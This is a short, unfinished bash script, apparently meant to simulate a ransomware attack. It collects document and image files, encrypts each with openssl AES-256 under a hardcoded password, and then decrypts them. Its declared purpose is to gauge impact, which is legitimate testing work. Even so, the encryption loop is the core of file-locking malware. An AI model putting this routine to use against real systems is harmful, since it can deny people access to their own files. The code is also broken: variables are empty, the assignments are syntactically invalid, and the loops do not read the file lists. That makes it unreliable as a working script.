#!/bin/bash
# Purpose:  Gauge impact and simulate a crypto malware attack
# Author: David Pratt
# Date: August, 2016
##############################################################

# declare variables
target_path=""
target_file=""
file_list=""
target_list=""
encrypted_file=""
decrypted_file=""
file_suffix=""
ciphertext="chuggles"
declare -a target_types=(".docx" ".xlsx" ".txt" ".jpeg" ".png" ".jpg")

# TO DO: script usage

# TO DO: check mapped drives we have access to

# TO DO: count target files we have write access to
find $target_path -type f 2>/dev/null >> $file_list
for extension in "${target_types[@]}"
do
	grep $extension $file_list >> $target_list
done

count_docx=$(find . -type f -name '*.docx' 2>/dev/null |wc -l)

# TO DO: encrypt function
for line in $target_list
do
	target_file = $line
	encrypted_file = $line.$file_suffix
	echo "Encrypting file..."
	echo "Target: $target_file"
	openssl enc -in $target_file -out $encrypted_file -e -aes256 -k $ciphertext
done


# TO DO: decrypt function
for line in $target_list
do
	target_file = $line.$file_suffix
	decrypted_file = $line
	echo "Decrypting file..."
	echo "Target: $target_file"
	openssl enc -in $target_file -out $decrypted_file -d -aes256 -k $ciphertext
done

